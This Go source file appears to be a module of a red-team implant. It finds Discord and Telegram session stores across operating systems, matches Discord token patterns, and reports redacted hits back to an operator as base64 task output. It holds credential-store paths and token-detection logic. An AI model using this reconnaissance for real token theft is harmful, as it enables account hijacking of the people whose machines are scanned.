//go:build linux || windows || darwin
// +build linux windows darwin

package main

// messaging_token_collect enumerates local chat-client session/token stores
// (火绒 1969 SeanPalia / 1945 OpenClaw) and reports an exposure assessment:
// which clients are installed, whether their leveldb/session files hold
// credential-shaped tokens, and a REDACTED preview. It deliberately does NOT
// return full tokens and does NOT call any third-party API to enrich accounts —
// extracting and replaying a live session is a different power from reporting
// that one is present on disk, and the latter is what a red-team exposure check
// needs. Same posture as wallet_collect.

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
)

const (
	msgMaxFiles       = 120
	msgMaxFileBytes   = 1 << 20 // skip files larger than 1 MiB
	msgMaxHitsPerFile = 20
	msgRedactKeep     = 6 // characters of a token kept in a preview
)

// messagingClient is one known chat client and the relative dirs to scan.
type messagingClient struct {
	label string
	dirs  []string
}

// messagingClients returns known client data locations for a platform, derived
// from home/appdata so the function is pure and testable with a temp dir.
func messagingClients(goos, home, appdata string) []messagingClient {
	add := func(label string, dirs ...string) messagingClient {
		return messagingClient{label: label, dirs: dirs}
	}
	switch goos {
	case "windows":
		return []messagingClient{
			add("Discord",
				filepath.Join(appdata, "discord", "Local Storage", "leveldb"),
				filepath.Join(appdata, "discordcanary", "Local Storage", "leveldb"),
				filepath.Join(appdata, "discordptb", "Local Storage", "leveldb"),
				filepath.Join(appdata, "discorddevelopment", "Local Storage", "leveldb")),
			add("Telegram", filepath.Join(appdata, "Telegram Desktop", "tdata")),
		}
	case "darwin":
		base := filepath.Join(home, "Library", "Application Support")
		return []messagingClient{
			add("Discord",
				filepath.Join(base, "discord", "Local Storage", "leveldb"),
				filepath.Join(base, "discordcanary", "Local Storage", "leveldb")),
			add("Telegram", filepath.Join(base, "Telegram", "tdata")),
		}
	default: // linux
		base := filepath.Join(home, ".config")
		return []messagingClient{
			add("Discord",
				filepath.Join(base, "discord", "Local Storage", "leveldb"),
				filepath.Join(base, "discordcanary", "Local Storage", "leveldb")),
			add("Telegram", filepath.Join(base, "TelegramDesktop", "tdata")),
		}
	}
}

// looksLikeDiscordToken reports whether s contains a credential-shaped token.
// Classic Discord tokens are three base64-ish segments joined by dots; the
// newer obfuscated form starts with the well-known "dQw4w9WgXcQ" marker. The
// query is about exposure presence, so a conservative pattern is enough.
func looksLikeDiscordToken(s string) bool {
	if strings.Contains(s, "dQw4w9WgXcQ") {
		return true
	}
	// Three dot-separated segments, first is numeric (user id), total length
	// in the usual token range.
	parts := strings.Split(s, ".")
	if len(parts) != 3 {
		return false
	}
	if len(parts[0]) < 15 || len(parts[0]) > 25 {
		return false
	}
	for _, r := range parts[0] {
		if r < '0' || r > '9' {
			return false
		}
	}
	return len(parts[1]) >= 6 && len(parts[2]) >= 20
}

// redactToken keeps only a short prefix so an operator can tell tokens apart
// without the result carrying a replayable credential.
func redactToken(s string) string {
	s = strings.TrimSpace(s)
	if len(s) <= msgRedactKeep {
		return strings.Repeat("*", len(s))
	}
	return s[:msgRedactKeep] + "…(" + fmt.Sprintf("%d chars", len(s)) + ")"
}

// collectMessagingFromClients walks each client dir and reports presence +
// bounded, redacted hits. Symlinks are skipped (never followed), files are
// capped in count and size, and only text (valid UTF-8, no NUL) is scanned.
func collectMessagingFromClients(clients []messagingClient) string {
	var sb strings.Builder
	files := 0
	for _, client := range clients {
		anyDir := false
		clientHits := 0
		for _, dir := range client.dirs {
			info, err := os.Lstat(dir)
			if err != nil || !info.IsDir() {
				continue
			}
			anyDir = true
			_ = filepath.WalkDir(dir, func(path string, d os.DirEntry, walkErr error) error {
				if walkErr != nil || files >= msgMaxFiles || clientHits >= msgMaxHitsPerFile {
					return nil
				}
				if d.Type()&os.ModeSymlink != 0 {
					return nil // skip the link, not the whole directory
				}
				if d.IsDir() {
					return nil
				}
				fi, err := d.Info()
				if err != nil || !fi.Mode().IsRegular() || fi.Size() > msgMaxFileBytes {
					return nil
				}
				files++
				b, err := os.ReadFile(path) // #nosec G122 -- symlinks skipped above; walk is over the victim's own chat dirs
				if err != nil {
					return nil
				}
				text := strings.ReplaceAll(string(b), "\x00", "")
				for _, line := range strings.Split(text, "\n") {
					if looksLikeDiscordToken(line) {
						fmt.Fprintf(&sb, "%s\t%s\ttoken %s\n", client.label,
							filepath.Base(path), redactToken(line))
						clientHits++
						if clientHits >= msgMaxHitsPerFile {
							break
						}
					}
				}
				return nil
			})
		}
		if !anyDir {
			fmt.Fprintf(&sb, "%s\t<not installed>\n", client.label)
		} else if clientHits == 0 {
			fmt.Fprintf(&sb, "%s\t<no token-shaped strings found>\n", client.label)
		}
	}
	if sb.Len() == 0 {
		return "no messaging client data directories found\n"
	}
	return sb.String()
}

func collectMessagingTokens() string {
	home := walletHome()
	clients := messagingClients(runtime.GOOS, home, os.Getenv("APPDATA"))
	return collectMessagingFromClients(clients)
}

func handleMessagingTokenCollect(task Task, res *TaskResult) {
	out := collectMessagingTokens()
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}
